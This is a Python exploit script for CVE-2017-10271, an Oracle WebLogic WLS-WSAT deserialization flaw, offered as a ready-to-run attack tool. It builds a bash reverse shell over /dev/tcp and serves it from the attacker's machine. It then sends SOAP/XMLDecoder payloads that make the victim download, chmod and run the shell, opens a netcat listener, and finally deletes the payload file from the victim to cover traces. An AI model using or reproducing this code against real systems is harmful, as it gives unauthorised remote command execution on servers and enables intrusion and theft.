#!/usr/bin/env python
#created by ya boi Ian (@n1tp1k)
#exploit code for CVE-2017-10271

#TODO
##add windows exploit functionality
##validate user input
##give ability to rename shell file
##remove netcat execution, have python handle reverse shell
##create installer to add any dependancies
##add more error handling
##add verbose flag to disable all messages or not

#IMPORT FILES
from argparse import ArgumentParser #for command line arguments
import os                           #for running commands like netcat, etc
import subprocess                   #for spawning processes to check if services are running
from requests import post           #for making post request to vulnerable service
import threading                    #for keeping listener open while other tasks are performmed
from threading import Thread        #for keeping listener open while other tasks are performmed
import SimpleHTTPServer             #for running web server
import SocketServer                 #for running web server

#main exploit class
class Exploit:
    
    def __init__(self, lhost, lport, target):
        self.lhost=lhost
        self.lport=lport
        self.target=target

    def splash(self):
        print """ $$$$$$\  $$\    $$\ $$$$$$$$\       $$$$$$\   $$$$$$\    $$\   $$$$$$$$\       $$\   $$$$$$\   $$$$$$\  $$$$$$$$\   $$\   
$$  __$$\ $$ |   $$ |$$  _____|     $$  __$$\ $$$ __$$\ $$$$ |  \____$$  |    $$$$ | $$$ __$$\ $$  __$$\ \____$$  |$$$$ |  
$$ /  \__|$$ |   $$ |$$ |           \__/  $$ |$$$$\ $$ |\_$$ |      $$  /     \_$$ | $$$$\ $$ |\__/  $$ |    $$  / \_$$ |  
$$ |      \$$\  $$  |$$$$$\ $$$$$$\  $$$$$$  |$$\$$\$$ |  $$ |     $$  /$$$$$$\ $$ | $$\$$\$$ | $$$$$$  |   $$  /    $$ |  
$$ |       \$$\$$  / $$  __|\______|$$  ____/ $$ \$$$$ |  $$ |    $$  / \______|$$ | $$ \$$$$ |$$  ____/   $$  /     $$ |  
$$ |  $$\   \$$$  /  $$ |           $$ |      $$ |\$$$ |  $$ |   $$  /          $$ | $$ |\$$$ |$$ |       $$  /      $$ |  
\$$$$$$  |   \$  /   $$$$$$$$\      $$$$$$$$\ \$$$$$$  /$$$$$$\ $$  /         $$$$$$\\\$$$$$$  /$$$$$$$$\ $$  /     $$$$$$\ 
 \______/     \_/    \________|     \________| \______/ \______|\__/          \______|\______/ \________|\__/      \______|"""

    def craftShell(self):
        #write shell script into current directory
        print "[$] Creating payload shell and placing in current directory"
        cmd = 'echo "bash -i >& /dev/tcp/'+self.lhost+'/'+self.lport+' 0>&1" > ./shell.sh'
        os.system(cmd)
 
    def startWebServer(self):
        #opens a web server on port 80 serving the current directory
        webPort = 80
        Handler = SimpleHTTPServer.SimpleHTTPRequestHandler

        httpd = SocketServer.TCPServer(("", webPort), Handler)
        print "[$] Hosting web server on port",webPort
        #should only need to handle a single request to pull shell file
        httpd.handle_request()
        
    def listen(self):
        #Start netcat listener for shell
        print "[$] Starting netcat listener on port",self.lport
        cmd = "nc -nvlp "+self.lport
        os.system(cmd)

        #clean up shell placed when shell closes
        print "[$] Deleting shell file from victim"
        self.postExploit("rm /tmp/shell.sh")

    def postExploit(self, cmd):
        #set headers for POST request
        headers = {
            "Content-Type":
            "text/xml",
            "User-Agent":
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0"
        }#headers
        
        #set URL for POST request, maybe make editable
        payloadURI = "/wls-wsat/CoordinatorPortType"
        url = self.target + payloadURI

        #set data to be posted
        data = """<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
          <soapenv:Header>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
              <java>
                <void class="java.lang.ProcessBuilder">
                  <array class="java.lang.String" length="3" >
                    <void index="0">
                      <string>/bin/sh</string>
                    </void>
                    <void index="1">
                      <string>-c</string>
                    </void>
                    <void index="2">
                      <string>"""+cmd+"""</string>
                    </void>
                  </array>
                  <void method="start"/>
                </void>
              </java>
            </work:WorkContext>
          </soapenv:Header>
          <soapenv:Body/>
        </soapenv:Envelope>"""
        try:
            req = post(url, data=data, headers=headers, timeout=10, verify=False)
        except Exception as e:
            print('[X] Connection Error')
            print(e)
 
    def run(self):
        #make sure that user is running as sudo
        if not os.getuid():
            #print splash
            self.splash()
            #creates shell and places in current directory for web hosting
            self.craftShell()
            #begins web server hosting current directory
            try:
                Thread(target = self.startWebServer, name = "startWebServer").start()
            except:
                print "[X] Unable to spawn thread to start web server"
            #creates thread to start netcat listener
            try:
                Thread(target = self.listen, name = "listen").start()
            except:
                print "[X] Unable to spawn thread for netcat listener"
            #get victim to download shell
            print "[$] Victim downloading shell file"
            self.postExploit("wget http://"+self.lhost+"/shell.sh -O /tmp/shell.sh")
            #give privilege to execute shell
            print "[$] Giving shell file execution privileges"
            self.postExploit("chmod +x /tmp/shell.sh")
            #run shell
            print "[$] Running shell"
            self.postExploit("/bin/bash /tmp/shell.sh")
        else:
            print "[$] Script must run as sudo to work properly"

#argument parser
if __name__ == "__main__":
    parser = ArgumentParser(
        description = """CVE-2017-10271 exploit code
                        Exploits vulnerability in Oracle Weblogic WLS Security subcomponent
                        Crafts and submits an XML payload to get bash reverse shell on vulnerable host
                        Vulnerable versions are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0
                        Requires netcat to be installed to work"""
    )

    parser.add_argument(
        '-l',
        '--lhost',
        required=True,
        dest='lhost',
        nargs='?',
        help='The listening host that the target should connect back to'
    )#add argument lhost

    parser.add_argument(
        '-p',
        '--lport',
        required=True,
        dest='lport',
        nargs='?',
        help='The listening port that the target should connect back to'
    )#add argument lport

    parser.add_argument(
        '-t',
        '--target',
        required=True,
        dest='target',
        nargs='?',
        help='The target host to exploit'
    )#add argument target
    
    args = parser.parse_args()

    exploit = Exploit(lhost=args.lhost, lport=args.lport, target=args.target)
    exploit.run()
